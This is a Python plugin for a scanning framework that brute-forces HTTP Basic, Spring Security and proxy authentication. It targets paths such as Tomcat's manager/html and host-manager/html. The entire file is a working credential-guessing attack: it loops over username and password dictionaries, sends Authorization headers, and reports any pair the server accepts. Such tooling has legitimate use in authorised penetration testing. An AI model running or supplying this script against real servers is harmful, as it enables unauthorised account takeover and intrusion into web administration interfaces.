#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.core.env import *
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from lib.util.cipherutil import base64encode
from script import BaseScript

class Script(BaseScript):
    """
    HTTP Basic Auth Burst
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB
        self.file_list = [
            "",
            "manager/html",
            "host-manager/html",
        ]

    def load_dict(self):
        username_txt_path = self.parameter.get("U", None)
        if username_txt_path:
            self.username_list = self.read_file(username_txt_path)
        else:
            self.username_list = self.get_default_dict("usernames.txt")

        password_txt_path = self.parameter.get("P", None)
        if password_txt_path:
            self.password_list = self.read_file(password_txt_path)
        else:
            self.password_list = self.get_default_dict("passwords.txt")


    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url):
                    if path[-1] == '/':
                        for file in self.file_list:
                            url = path + file
                            try:
                                async with session.get(url=url, allow_redirects=False) as res:
                                    if res:
                                        text = await res.text()
                                        if res and (
                                            # HTTP basic auth
                                            (res.status == 401 and 'WWW-Authenticate' in res.headers.keys()) or

                                            # Spring Security Application
                                            (text and res.status == 200 and "Full authentication is required to access this resource" in text) or

                                            # 407 407 Proxy Authentication Required
                                            (text and res.status == 407 and "407 Proxy Authentication Required" in text)
                                        ):

                                            async for username, password in self.generate_auth_dict(self.username_list, self.password_list):
                                                key = base64encode(bytes(":".join([username, password]), 'utf-8'))
                                                headers = {"Authorization": 'Basic %s' % key}
                                                async with session.get(url=url, headers=headers) as res1:
                                                    if res1:
                                                        if res1.status != 401 and  res1.status != 407:
                                                            detail = username + "/" + password
                                                            yield f"{url}   {detail}"
                                                            
                            except:
                                pass